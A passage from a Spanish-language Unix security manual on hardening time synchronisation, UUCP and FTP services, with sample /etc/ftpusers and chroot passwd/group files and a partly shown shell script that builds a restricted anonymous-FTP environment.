con&#xFB01;gurado o si no utilizamos versiones actualizadas de nntpd, el demonio que ofrece este
servicio.
<!--br/-->
<!--br/-->Son muchos los problemas de seguridad relacionados con un tiempo correcto; el m&#x00E1;s simple y obvio es la
poca &#xFB01;abilidad que ofrecer&#x00E1; nuestro sistema de log a la hora de determinar cu&#x00E1;ndo sucedi&#x00F3; determinado

evento: aunque se registrara que alguien hizo un telnet a las tres de la tarde, no podr&#x02CA;&#x0131;amos ni siquiera
asegurar que la hora es correcta. Otro problema t&#x02CA;&#x0131;pico radica en las facilidades que ofrece Unix para la
plani&#xFB01;caci&#x00F3;n de tareas: si el reloj tiene problemas, es posible que ciertas tareas no se lleguen a
ejecutar, que se ejecuten varias veces, o que se ejecuten cuando no han de hacerlo; esto es
especialmente peligroso para tareas de las que depende nuestra seguridad, como la rotaci&#x00F3;n de logs. Si
hablamos de problemas m&#x00E1;s so&#xFB01;sticados, podemos pensar en sistemas distribuidos, en los que una
correcta sincronizaci&#x00F3;n entre nodos es b&#x00E1;sica para garantizar el correcto funcionamiento del
sistema global (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;); la sincronizaci&#x00F3;n es muy importantes en modelos de autenticaci&#x00F3;n como
Kerberos, que utiliza marcas de tiempo como pruebas de frescura para evitar ataques por
reenv&#x02CA;&#x0131;o.
<!--br/-->
<!--br/-->Como hemos visto, una correcta sincronizaci&#x00F3;n del reloj de nuestro equipo es vital para la seguridad; no
obstante, muy pocos sistemas necesitan la precisi&#x00F3;n de NTP, por lo que es habitual tener este servicio
deshabilitado. En la mayor&#x02CA;&#x0131;a de ocasiones el propio reloj de la m&#x00E1;quina, o un protocolo mucho m&#x00E1;s simple,
como time, es m&#x00E1;s que su&#xFB01;ciente para sincronizar equipos.
  </para></section><!--end subsection--><!--l. 469--><section 
role="subsection"><title><abbrev role="title-mark">14.2.11</abbrev><anchor 
   id="x1-21700014.2.11"  ></anchor>UUCP</title>
<!--l. 470--><para>  UUCP (Unix to Unix CoPy, puerto 540 TCP) es un servicio que, como su nombre indica, se
utiliza para copiar &#xFB01;cheros entre m&#x00E1;quinas Unix, generalmente a trav&#x00E9;s de l&#x02CA;&#x0131;neas telef&#x00F3;nicas o
redes de baja velocidad; aunque hoy en d&#x02CA;&#x0131;a apenas se utiliza, durante a~nos ha sido la base de
los sistemas de correo electr&#x00F3;nico y de news (incluso hoy en d&#x02CA;&#x0131;a algunos sistemas UUCP son
capaces de transmitir noticias de Usenet m&#x00E1;s e&#xFB01;cientemente que la m&#x00E1;s moderna implementaci&#x00F3;n de
NNTP).
<!--br/-->
<!--br/-->Dos riesgos fundamentales amenazan a UUCP: al tratarse de una transmisi&#x00F3;n en texto claro, un potencial
atacante puede tener acceso a informaci&#x00F3;n privada de los usuarios, vulnerando su privacidad.
Evidentemente, en el caso de transmisi&#x00F3;n de news esto no es muy relevante, ya que todos los mensajes son
en principio de acceso p&#x00FA;blico, pero la cosa cambia si estamos transmitiendo correo electr&#x00F3;nico. El segundo
riesgo es incluso m&#x00E1;s preocupante que la p&#x00E9;rdida de privacidad: las contrase~nas de los usuarios tambi&#x00E9;n se
transmiten en texto claro, con el consiguiente peligro que supone la interceptaci&#x00F3;n por parte de un
pirata de dichas claves. Aunque si utilizamos l&#x02CA;&#x0131;neas telef&#x00F3;nicas la probabilidad de que un sni&#xFB00;er
capture los datos enviados es menor que si utilizamos una red TCP, en ambos casos el riesgo est&#x00E1;
presente.
<!--br/-->
<!--br/-->Como siempre, y dado que como hemos dicho UUCP no se suele utilizar hoy en d&#x02CA;&#x0131;a, lo m&#x00E1;s recomendable es
deshabilitar este servicio; es m&#x00E1;s, dado que suele existir un usuario uucp en todo sistema Unix (por
motivos simplemente de compatibilidad), hemos de estar atentos a los posibles problemas que dicho
usuario pueda generar. Es necesario asegurarse que no se permiten conexiones bajo este nombre de
usuario, que en su directorio $HOME no existen un &#xFB01;chero .rhosts&#x2026;las precauciones habituales con
cualquier nombre de usuario de este tipo que tengamos en nuestro sistema; incluso nos puede interesar
sustituir su shell original (si lo tiene) por uno como /bin/false, para que un posible atacante
que se haga pasar por uucp no tenga posibilidad de ejecutar &#x00F3;rdenes en la m&#x00E1;quina. Si estamos
obligados a ofrecer conexiones v&#x02CA;&#x0131;a UUCP en nuestro sistema, una buena referencia para conocer m&#x00E1;s
detalles de este mecanismo y su seguridad es <citation>[?]</citation> (s&#x00F3;lo su fecha nos da una idea del grado de
desuso en que ha ca&#x02CA;&#x0131;do UUCP); otra excelente fuente de informaci&#x00F3;n sobre la seguridad &#x2013; e
inseguridad &#x2013; de UUCP es el cap&#x02CA;&#x0131;tulo 15 de <citation>[?]</citation>. Una medida de protecci&#x00F3;n b&#x00E1;sica es asignar un login y
password diferente para cada sistema que conecte con el nuestro mediante este m&#x00E9;todo; aparte
de incrementar la seguridad &#x2013; si un atacante averigua una clave s&#x00F3;lo podr&#x00E1; utilizar un acceso,
no todos &#x2013; as&#x02CA;&#x0131; conseguimos un mayor re&#xFB01;namiento a la hora de registrar los eventos que se
produzcan en nuestro sistema, lo que es muy &#x00FA;til de cara a perseguir un abuso del servicio por parte
de usuarios no autorizados. Adem&#x00E1;s, en situaciones extremas podemos con&#xFB01;gurar los m&#x00F3;dems
para realizar un callback cuando reciben una petici&#x00F3;n, lo que asegura que estamos llamando al
sistema deseado y no a otro &#x2013; siempre que un atacante no haya podido modi&#xFB01;car esos n&#x00FA;meros
&#x2013;.

  </para></section><!--end subsection--></section><!--end section--><!--l. 516--><section 
role="section"><title><abbrev role="title-mark">14.3</abbrev><anchor 
   id="x1-21800014.3"  ></anchor>El servicio FTP</title>
<!--l. 517--><para>  FTP (File Transfer Protocol, puerto 21 TCP) es, como su nombre indica, un protocolo de transferencia de
&#xFB01;cheros entre sistemas. Desde un equipo cliente conectamos a un servidor para descargar &#xFB01;cheros desde &#x00E9;l &#x2013;
lo habitual &#x2013; o para enviarle nuestros propios archivos.
<!--br/-->
<!--br/-->Un problema b&#x00E1;sico y grave de FTP es que est&#x00E1; pensado para ofrecer la m&#x00E1;xima velocidad en la conexi&#x00F3;n, pero
ni mucho menos para ofrecer la m&#x00E1;xima seguridad; todo el intercambio de informaci&#x00F3;n, desde el login y
password del usuario en el servidor hasta la transferencia de cualquier &#xFB01;chero, se realiza en texto claro, con
lo que un atacante lo tiene muy f&#x00E1;cil para capturar todo ese tr&#x00E1;&#xFB01;co y conseguir as&#x02CA;&#x0131; un acceso v&#x00E1;lido al
servidor. Incluso puede ser una amenaza a la privacidad de nuestros datos el hecho de que ese atacante
tambi&#x00E9;n pueda capturar y reproducir los &#xFB01;cheros transferidos. Para solucionar este problema es conveniente
concienciar a nuestros usuarios de la utilidad de aplicaciones como scp y sftp, incluidas en el paquete
SSH, que permiten transferir &#xFB01;cheros pero cifrando todo el tr&#x00E1;&#xFB01;co; de esta forma, son el mejor sustituto de
FTP.
<!--br/-->
<!--br/-->Parece evidente que la conexi&#x00F3;n FTP a nuestro sistema ha de estar restringida a los usuarios que realmente
lo necesiten: por ejemplo, un usuario como root en principio no va a necesitar utilizar este servicio, ya que
por lo general va a trabajar en consola; otros usuarios considerados &#x2018;del sistema&#x2019; (donde se incluye por
ejemplo a postmaster, bin, uucp, shutdown, daemon&#x2026;) tampoco necesitar&#x00E1;n hacer uso de FTP.
Podemos indicar este tipo de usuarios a los que no les est&#x00E1; permitida una conexi&#x00F3;n v&#x02CA;&#x0131;a FTP a
nuestra m&#x00E1;quina en /etc/ftpusers, con un nombre por l&#x02CA;&#x0131;nea; un ejemplo de este &#xFB01;chero es el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/etc/ftpusers
&#x00A0;halt
&#x00A0;operator
&#x00A0;root
&#x00A0;shutdown
&#x00A0;sync
&#x00A0;bin
&#x00A0;daemon
&#x00A0;adm
&#x00A0;lp
&#x00A0;mail
&#x00A0;postmaster
&#x00A0;news
&#x00A0;uucp
&#x00A0;man
&#x00A0;games
&#x00A0;guest
&#x00A0;postgres&#x00A0;#&#x00A0;&#x2019;postgres&#x2019;&#x00A0;NO&#x00A0;hace&#x00A0;ftp
&#x00A0;nobody
&#x00A0;inferno
&#x00A0;luisa:~#
</literallayout>
<!--l. 570--><para>
  </para><!--l. 570--><section 
role="subsection"><title><abbrev role="title-mark">14.3.1</abbrev><anchor 
   id="x1-21900014.3.1"  ></anchor>FTP an&#x00F3;nimo</title>
<!--l. 571--><para>  Los problemas relacionados con la seguridad del servicio FTP son especialmente preocupantes cuando se
trata de con&#xFB01;gurar un servidor de FTP an&#x00F3;nimo; muchos de estas m&#x00E1;quinas situadas en universidades
espa~nolas se convierten en servidores de im&#x00E1;genes pornogr&#x00E1;&#xFB01;cas o de warez (copias ilegales de programas
comerciales). Conseguir un servidor de FTP an&#x00F3;nimo seguro puede llegar a ser una tarea complicada: incluso
en las p&#x00E1;ginas de ayuda de algunas variantes de Unix (como Solaris) se trata de facilitar el proceso para el
administrador mediante un shellscript que &#x2013; por defecto &#x2013; presenta graves problemas de seguridad,
ya que deja una copia del &#xFB01;chero de claves del sistema como un archivo de acceso p&#x00FA;blico y
an&#x00F3;nimo.
<!--br/-->
<!--br/-->Para con&#xFB01;gurar correctamente un servidor de este tipo necesitamos en primer lugar crear al usuario ftp en
/etc/passwd y /etc/shadow, as&#x02CA;&#x0131; como su directorio de conexi&#x00F3;n (algunos Unices, como Linux, ya
incorporan esto al instalar el sistema). Este directorio ha de pertenecer a root (ning&#x00FA;n &#xFB01;chero o
subdirectorio ha de pertenecer nunca a ftp) y al grupo al que pertenece ftp: con esto conseguimos que
los permisos de propietario sean para el administrador y los de grupo para los usuarios an&#x00F3;nimos; estos
permisos ser&#x00E1;n 555.
<!--br/-->
<!--br/-->Dentro del $HOME de ftp hemos de crear el &#x00E1;rbol de directorios m&#x02CA;&#x0131;nimo para poder trabajar
correctamente; esto es debido a la llamada a chroot() que se utiliza en los accesos an&#x00F3;nimos, que permite a
esos usuarios ver el directorio ra&#x02CA;&#x0131;z de su conexi&#x00F3;n en el directorio real ~ftp/. Al menos dos directorios son
necesarios: etc/ y bin/, ambos propiedad de root y con modo 111. En el primero de ellos hemos de crear
un &#xFB01;chero passwd y otro group, utilizados no con prop&#x00F3;sitos de autenticaci&#x00F3;n sino para visualizar el
propietario y grupo de cada &#xFB01;chero en el entorno sobre el que se ha aplicado chroot() al ejecutar ls: por
tanto, no hace falta ninguna contrase~na en ese &#xFB01;chero passwd, y s&#x00F3;lo ha de contener entradas para los
usuarios que posean &#xFB01;cheros bajo la jerarqu&#x02CA;&#x0131;a de ftp, como root; de la misma forma, el &#xFB01;chero
group s&#x00F3;lo ha de contener las entradas correspondientes a grupos que posean &#xFB01;cheros en dicha
jerarqu&#x02CA;&#x0131;a:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/export/home/ftp/etc/passwd
&#x00A0;root:*:0:1:El&#x00A0;Spiritu&#x00A0;Santo:/:/sbin/sh
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/export/home/ftp/etc/group
&#x00A0;root::0:
&#x00A0;other::1:
&#x00A0;daemon::2:
&#x00A0;ftp::30000:
&#x00A0;anita:~#
</literallayout>
<!--l. 619--><para>Como vemos, el usuario ftp tiene un shell denominado /bin/false; aunque aqu&#x02CA;&#x0131; no tiene ning&#x00FA;n efecto, en el
archivo de contrase~nas real de la m&#x00E1;quina esto es &#x00FA;til para prevenir que dicho usuario pueda conectar
mediante TELNET o similar.
<!--br/-->
<!--br/-->Por su parte, en el otro directorio que hemos creado (bin/) hemos de almacenar una copia del programa
ls, de forma que los usuarios puedan listar los contenidos de los directorios cuyos permisos lo
permitan; si utilizamos una versi&#x00F3;n est&#x00E1;tica del programa, como hace por ejemplo Linux, no
hemos de con&#xFB01;gurar nada para que la aplicaci&#x00F3;n funcione, pero si en cambio utilizamos un ls
din&#x00E1;mico (como SunOS o Solaris) hemos de crear el directorio lib/ dentro de ~ftp/ y copiar en
&#x00E9;l las librer&#x02CA;&#x0131;as necesarias para que el programa funcione (podemos ver de cu&#x00E1;les se trata con
ldd).
<!--br/-->
<!--br/-->Con estos pasos ya tenemos con&#xFB01;gurada la base de nuestro servidor de FTP an&#x00F3;nimo; no obstante, es
habitual crear dos directorios m&#x00E1;s, uno denominado pub/ y otro incoming/, dentro de la misma jerarqu&#x02CA;&#x0131;a
que los anteriores (esto es, en el $HOME del usuario ftp). El primero suele contener directorios
con todos los &#xFB01;cheros que deseemos ofrecer a los usuarios an&#x00F3;nimos; su modo ha de ser 555, o
2555 en los sistemas que utilicen el bit setgid en un directorio para que sus subdirectorios y
&#xFB01;cheros hereden el grupo del propietario. El directorio incoming es justo lo contrario: sirve
para que esos usuarios an&#x00F3;nimos puedan enviar archivos a nuestra m&#x00E1;quina. Y es aqu&#x02CA;&#x0131; donde
suelen comenzar muchos problemas: al permitir el upload de software, es posible que algunos
piratas utilicen nuestra m&#x00E1;quina para crear servidores warez, subiendo programas comerciales a
este directorio y luego indicando su localizaci&#x00F3;n exacta a otras personas, para que los puedan
descargar. Por tanto, los permisos de incoming son vitales para nuestra seguridad (incluso si
no deseamos que los usuarios an&#x00F3;nimos nos env&#x02CA;&#x0131;en &#xFB01;cheros podemos borrar este directorio):
esos permisos han de ser 1733, y el propietario del directorio es el root. &#x00BF;Para qu&#x00E9; ponemos el
bit de permanencia? Muy sencillo: para que los usuarios no puedan sobreescribir o borrar
&#xFB01;cheros existentes; aunque la mayor&#x02CA;&#x0131;a de servidores FTP no permiten a los usuarios an&#x00F3;nimos
sobreescribir &#xFB01;cheros, si no pusi&#x00E9;ramos este modo un usuario normal del sistema s&#x02CA;&#x0131; que podr&#x02CA;&#x0131;a
hacerlo.
<!--br/-->
<!--br/-->El siguiente shellscript puede utilizarse para con&#xFB01;gurar c&#x00F3;modamente un entorno restringido destinado a los usuarios
de FTP an&#x00F3;nimo siguiendo las directrices que acabamos de comentar; funciona correctamente (en teor&#x02CA;&#x0131;a) sobre Solaris,
Linux y AIX <anchor 
   id="x1-219001f3"  ></anchor><footnote><para>     En este &#x00FA;ltimo es necesario instalar la utilidad ldd, que por defecto no se distribuye con el operativo.</para></footnote>.
Al igual que sucede con muchas tareas automatizadas, conviene repasar manualmente la estructura de
directorios y &#xFB01;cheros creados para comprobar que todo es como esper&#x00E1;bamos:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/usr/local/sbin/creaentorno
&#x00A0;#!/bin/sh
&#x00A0;#&#x00A0;Script&#x00A0;para&#x00A0;crear&#x00A0;un&#x00A0;entorno&#x00A0;chroot()eado.
&#x00A0;#&#x00A0;Funciona&#x00A0;OK&#x00A0;en&#x00A0;Linux,&#x00A0;Solaris&#x00A0;y&#x00A0;AIX.
&#x00A0;#
&#x00A0;
&#x00A0;#&#x00A0;Esta&#x00A0;variable&#x00A0;es&#x00A0;una&#x00A0;lista&#x00A0;con&#x00A0;los&#x00A0;programas&#x00A0;que&#x00A0;necesitamos&#x00A0;en&#x00A0;el
&#x00A0;#&#x00A0;entorno&#x00A0;restringido.
&#x00A0;PROGS=&#x0022;/bin/ls&#x0022;
&#x00A0;#&#x00A0;Imprime&#x00A0;modo&#x00A0;de&#x00A0;uso
&#x00A0;if&#x00A0;(test&#x00A0;$#&#x00A0;-lt&#x00A0;1);&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;Usage:&#x00A0;$0&#x00A0;/path/to/chroot-environment&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;exit
&#x00A0;fi
&#x00A0;#&#x00A0;Detectamos&#x00A0;clon&#x00A0;de&#x00A0;Unix
&#x00A0;OS=&#x2018;uname&#x00A0;-s&#x2018;
&#x00A0;#&#x00A0;Creamos&#x00A0;estructura&#x00A0;de&#x00A0;directorios
&#x00A0;echo&#x00A0;&#x0022;Creando&#x00A0;estructura&#x00A0;de&#x00A0;directorios&#x00A0;para&#x00A0;$OS&#x0022;
&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;$1&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;$1
&#x00A0;fi
&#x00A0;chown&#x00A0;root&#x00A0;$1
&#x00A0;for&#x00A0;i&#x00A0;in&#x00A0;bin&#x00A0;etc;&#x00A0;do
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;$1/$i&#x00A0;]&#x00A0;;&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;$1/$i
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chown&#x00A0;root&#x00A0;$1/$i
&#x00A0;done
&#x00A0;#&#x00A0;En&#x00A0;funcion&#x00A0;del&#x00A0;Unix,&#x00A0;la&#x00A0;estructura&#x00A0;sera&#x00A0;una&#x00A0;u&#x00A0;otra...
&#x00A0;if&#x00A0;[&#x00A0;$OS&#x00A0;=&#x00A0;&#x0022;Linux&#x0022;&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;$1/lib&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;$1/lib
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chown&#x00A0;root&#x00A0;$1/lib
&#x00A0;fi
&#x00A0;if&#x00A0;(&#x00A0;test&#x00A0;$OS&#x00A0;=&#x00A0;&#x0022;SunOS&#x0022;&#x00A0;||&#x00A0;test&#x00A0;$OS&#x00A0;=&#x00A0;&#x0022;AIX&#x0022;&#x00A0;);&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;$1/usr/lib&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;$1/usr/lib
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chown&#x00A0;root&#x00A0;$1/usr/lib
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cd&#x00A0;$1
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ln&#x00A0;-s&#x00A0;./usr/lib&#x00A0;$1/lib
&#x00A0;fi
&#x00A0;#&#x00A0;Instalamos&#x00A0;programas&#x00A0;y&#x00A0;las&#x00A0;librerias&#x00A0;que&#x00A0;necesitan
&#x00A0;echo&#x00A0;&#x0022;Instalando&#x00A0;programas&#x00A0;y&#x00A0;librerias...&#x0022;
&#x00A0;for&#x00A0;i&#x00A0;in&#x00A0;$PROGS;&#x00A0;do
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-f&#x00A0;$1/$i&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cp&#x00A0;$i&#x00A0;$1/bin
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chmod&#x00A0;111&#x00A0;$1/bin
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chown&#x00A0;root&#x00A0;$1/bin
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;$OS&#x00A0;=&#x00A0;&#x0022;AIX&#x0022;&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;for&#x00A0;j&#x00A0;in&#x00A0;&#x2018;ldd&#x00A0;$i|awk&#x00A0;-F&#x0022;(&#x0022;&#x00A0;&#x2019;{if(NR!=1)&#x00A0;print&#x00A0;$1}&#x2019;&#x2018;;&#x00A0;do

&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-f&#x00A0;$1/$j&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cp&#x00A0;$j&#x00A0;$1/lib
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chown&#x00A0;root&#x00A0;$1/$j
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;done
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;else
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;for&#x00A0;j&#x00A0;in&#x00A0;&#x2018;ldd&#x00A0;$i|awk&#x00A0;&#x2019;{print&#x00A0;$3}&#x2019;&#x2018;;&#x00A0;do
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-f&#x00A0;$1/$j&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cp&#x00A0;$j&#x00A0;$1/lib
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chown&#x00A0;root&#x00A0;$1/$j
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;done
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;done
&#x00A0;#&#x00A0;Estos&#x00A0;ficheros&#x00A0;quizas&#x00A0;sea&#x00A0;necesario&#x00A0;retocarlos&#x00A0;a&#x00A0;mano,&#x00A0;en&#x00A0;funcion&#x00A0;del&#x00A0;tipo
&#x00A0;#&#x00A0;de&#x00A0;entorno&#x00A0;restringido&#x00A0;que&#x00A0;fabriquemos.
&#x00A0;#&#x00A0;Generamos&#x00A0;PASSWD
&#x00A0;echo&#x00A0;&#x0022;Generando&#x00A0;/etc/passwd...&#x0022;
&#x00A0;awk&#x00A0;-F:&#x00A0;&#x2019;$1==&#x0022;root&#x0022;&#x00A0;{print&#x00A0;$1&#x0022;:*:&#x0022;$3&#x0022;:&#x0022;$4&#x0022;:&#x0022;$5&#x0022;:&#x0022;$6&#x0022;:&#x0022;$7}&#x2019;&#x00A0;/etc/passwd&#x00A0;&#x003E;&#x005C;
&#x00A0;$1/etc/passwd
&#x00A0;awk&#x00A0;-F:&#x00A0;&#x2019;$1==&#x0022;bin&#x0022;&#x00A0;{print&#x00A0;$1&#x0022;:*:&#x0022;$3&#x0022;:&#x0022;$4&#x0022;:&#x0022;$5&#x0022;:&#x0022;$6&#x0022;:&#x0022;$7}&#x2019;&#x00A0;/etc/passwd&#x003E;&#x003E;&#x005C;
&#x00A0;$1/etc/passwd
&#x00A0;awk&#x00A0;-F:&#x00A0;&#x2019;$1==&#x0022;daemon&#x0022;&#x00A0;{print&#x00A0;$1&#x0022;:*:&#x0022;$3&#x0022;:&#x0022;$4&#x0022;:&#x0022;$5&#x0022;:&#x0022;$6&#x0022;:&#x0022;$7}&#x2019;&#x00A0;/etc/passwd&#x003E;&#x003E;&#x005C;
&#x00A0;$1/etc/passwd
&#x00A0;chmod&#x00A0;444&#x00A0;$1/etc/passwd
&#x00A0;chown&#x00A0;root&#x00A0;$1/etc/passwd
&#x00A0;#&#x00A0;Quizas&#x00A0;hay&#x00A0;que&#x00A0;anyadir&#x00A0;otros&#x00A0;grupos&#x00A0;que&#x00A0;nos&#x00A0;interesen
&#x00A0;#&#x00A0;Generamos&#x00A0;GROUP&#x00A0;con&#x00A0;algunas&#x00A0;entradas
&#x00A0;echo&#x00A0;&#x0022;Generando&#x00A0;/etc/group...&#x0022;
&#x00A0;awk&#x00A0;-F:&#x00A0;&#x2019;$1==&#x0022;root&#x0022;&#x00A0;{print&#x00A0;$1&#x0022;:*:&#x0022;$3&#x0022;:&#x0022;$4}&#x2019;&#x00A0;/etc/group&#x003E;$1/etc/group
&#x00A0;awk&#x00A0;-F:&#x00A0;&#x2019;$1==&#x0022;bin&#x0022;&#x00A0;{print&#x00A0;$1&#x0022;:*:&#x0022;$3&#x0022;:&#x0022;}&#x2019;&#x00A0;/etc/group&#x003E;&#x003E;$1/etc/group
&#x00A0;awk&#x00A0;-F:&#x00A0;&#x2019;$1==&#x0022;daemon&#x0022;&#x00A0;{print&#x00A0;$1&#x0022;:*:&#x0022;$3&#x0022;:&#x0022;}&#x2019;&#x00A0;/etc/group&#x003E;&#x003E;$1/etc/group
&#x00A0;chmod&#x00A0;444&#x00A0;$1/etc/group
&#x00A0;chown&#x00A0;root&#x00A0;$1/etc/group
&#x00A0;#&#x00A0;Generamos&#x00A0;pub/&#x00A0;e&#x00A0;incoming/
&#x00A0;echo&#x00A0;&#x0022;Generando&#x00A0;pub/&#x00A0;e&#x00A0;incoming/...&#x0022;
&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;$1/pub&#x00A0;];&#x00A0;then
